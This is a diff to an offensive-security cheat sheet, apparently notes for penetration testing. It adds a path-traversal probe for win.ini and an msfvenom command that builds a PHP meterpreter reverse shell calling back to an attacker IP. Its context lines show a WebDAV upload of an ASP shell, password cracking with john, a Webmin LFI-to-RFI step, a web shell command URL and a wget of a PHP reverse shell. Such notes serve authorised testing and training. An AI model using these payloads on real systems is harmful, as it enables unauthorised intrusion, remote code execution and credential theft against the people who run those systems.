@@ -144,6 +144,8 @@ curl -X MOVE --header 'Destination:http://host/shell.asp' 'http://host/test.txt'
 	john --wordlist=/usr/share/wordlists/sqlmap.txt --format=md5crypt passwords.txt
 	john --show passwords.txt
 	```
+* Look for Windows files
+	* /../../../../Windows/win.ini
 * Webmin Local File Disclosure
 	* Look at source code and its more of a [LFI](https://www.exploit-db.com/exploits/2017)
 	* We have LFI and we want to get RFI so we upload a reverse shell with our low priv shell
@@ -206,6 +208,11 @@ test2.PHP
 		Go to http://victimsite.com/test.php?cmd=dir for command execution 
 
 		* [Windows PHP Reverse Shell](https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php)
+			* Need to modify tmpdir to make it work; play around with it
+		* Msfvenom
+			```
+			msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.php
+			```
 	* [Other languages/compabibility](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 	* [Full shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
 		* wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
